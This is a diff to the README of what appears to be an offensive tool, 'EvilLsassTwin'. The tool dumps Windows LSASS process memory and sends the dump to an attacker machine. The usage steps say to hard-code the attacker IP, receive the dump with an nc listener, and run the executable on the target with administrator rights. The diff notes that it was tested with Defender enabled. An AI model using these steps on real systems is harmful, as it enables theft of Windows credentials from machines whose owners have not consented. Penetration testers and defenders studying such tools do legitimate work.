@@ -14,15 +14,19 @@ How this works:
 4. File is deleted after open handle to it is closed
 5. Mapped Data (memory dump) is sent to server
  
-Requires the `winim` and `ptr_math` modules. Numerous IOCs and opportunities for detection since this simple port was not built with stealth in mind. However, as noted above, this project _does_ include some stealthy features. Tested on Windows 10 22H2 and Windows 11 with Defender enabled (Cloud Analysis disabled).
+Requires the `winim` and `ptr_math` modules. Numerous IOCs and opportunities for detection since this simple port was not built with stealth in mind. However, as noted above, this project _does_ include some stealthy features. 
+
+Tested on Windows 10 22H2 and Windows 11 with Defender enabled (Cloud Analysis disabled).
+
+Must be run from an Administrator Command Prompt or Powershell as EvilLsassTwin depends on the SeDebugPrivilege. _Note: SeDebugPrvilege is enabled by default on (Administrator) Powershell._
 
 # Usage
-This project was developed and tested with Nim 1.6.14. It has not yet been tested for compatibility with Nim 2.0.
+This project was developed and tested with Nim 1.6.10 and 1.6.14. It is **not** compatible with Nim 2.0.
 
 1. Install Dependencies with `nim dependencies` or through Nimble package manager (Atlas not yet tested)
 2. Edit line 291 in `EvilLsassTwin.nim` file to include your server's (attacker machine) IP address. Optionally: You may change the port number as well. If you do change the port, it needs to be changed within the `EvilLsassTwinServer.nim` file as well.
 3. Compile the project with `nim build`.
-4. `chmod +x EvilLsassTwinServer && ./EvilLsassTwinServer` Alternatively: `nc -lvnp 6500 > EvilTwin.dmp`
+4. `chmod +x EvilTwinServer && ./EvilTwinServer` Alternatively: `nc -lvnp 6500 > EvilTwin.dmp`
 5. Transfer EvilLsassTwin.exe to (Windows) target machine and Run.   
 
 # Resources
